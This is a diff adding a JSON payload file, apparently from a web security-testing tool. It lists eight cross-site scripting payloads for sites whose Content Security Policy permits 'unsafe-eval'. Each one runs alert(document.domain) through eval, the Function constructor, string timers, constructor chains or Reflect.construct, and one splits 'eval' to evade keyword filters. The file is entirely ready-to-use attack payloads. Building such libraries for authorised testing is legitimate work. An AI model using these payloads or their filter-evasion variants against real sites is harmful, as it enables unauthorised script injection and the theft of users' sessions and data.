@@ -1,0 +1,80 @@
+{
+  "category": "csp_bypass",
+  "subcategory": "unsafe_eval",
+  "description": "Payloads for CSPs with 'unsafe-eval' in script-src — eval/Function-based execution",
+  "count": 8,
+  "payloads": [
+    {
+      "id": "csp-eval-001",
+      "category": "csp_bypass",
+      "subcategory": "unsafe_eval",
+      "payload": "<script>eval('alert(document.domain)')</script>",
+      "description": "eval() execution — direct unsafe-eval abuse",
+      "technique": "unsafe_eval",
+      "csp_bypass": "unsafe-eval allows eval() calls"
+    },
+    {
+      "id": "csp-eval-002",
+      "category": "csp_bypass",
+      "subcategory": "unsafe_eval",
+      "payload": "<script>Function('alert(document.domain)')()</script>",
+      "description": "Function constructor — alternative to eval()",
+      "technique": "unsafe_eval",
+      "csp_bypass": "unsafe-eval allows Function() constructor"
+    },
+    {
+      "id": "csp-eval-003",
+      "category": "csp_bypass",
+      "subcategory": "unsafe_eval",
+      "payload": "<script>setTimeout('alert(document.domain)',0)</script>",
+      "description": "setTimeout with string arg — requires unsafe-eval",
+      "technique": "unsafe_eval",
+      "csp_bypass": "unsafe-eval allows setTimeout with string argument"
+    },
+    {
+      "id": "csp-eval-004",
+      "category": "csp_bypass",
+      "subcategory": "unsafe_eval",
+      "payload": "<script>setInterval('alert(document.domain)',0)</script>",
+      "description": "setInterval with string arg — requires unsafe-eval",
+      "technique": "unsafe_eval",
+      "csp_bypass": "unsafe-eval allows setInterval with string argument"
+    },
+    {
+      "id": "csp-eval-005",
+      "category": "csp_bypass",
+      "subcategory": "unsafe_eval",
+      "payload": "<script>[].constructor.constructor('alert(document.domain)')()</script>",
+      "description": "Array constructor chain — indirect Function() access",
+      "technique": "unsafe_eval",
+      "csp_bypass": "unsafe-eval allows constructor chain to Function()"
+    },
+    {
+      "id": "csp-eval-006",
+      "category": "csp_bypass",
+      "subcategory": "unsafe_eval",
+      "payload": "<script>window['ev'+'al']('alert(document.domain)')</script>",
+      "description": "Concatenated eval — evades keyword filters",
+      "technique": "unsafe_eval",
+      "csp_bypass": "unsafe-eval with string concatenation to bypass WAF"
+    },
+    {
+      "id": "csp-eval-007",
+      "category": "csp_bypass",
+      "subcategory": "unsafe_eval",
+      "payload": "<script>Reflect.construct(Function,['alert(document.domain)'])()</script>",
+      "description": "Reflect.construct — modern eval alternative",
+      "technique": "unsafe_eval",
+      "csp_bypass": "unsafe-eval allows Reflect.construct with Function"
+    },
+    {
+      "id": "csp-eval-008",
+      "category": "csp_bypass",
+      "subcategory": "unsafe_eval",
+      "payload": "<script>new(Function)('alert(document.domain)')()</script>",
+      "description": "new Function() with parens — syntax variation",
+      "technique": "unsafe_eval",
+      "csp_bypass": "unsafe-eval allows new Function() variations"
+    }
+  ]
+}
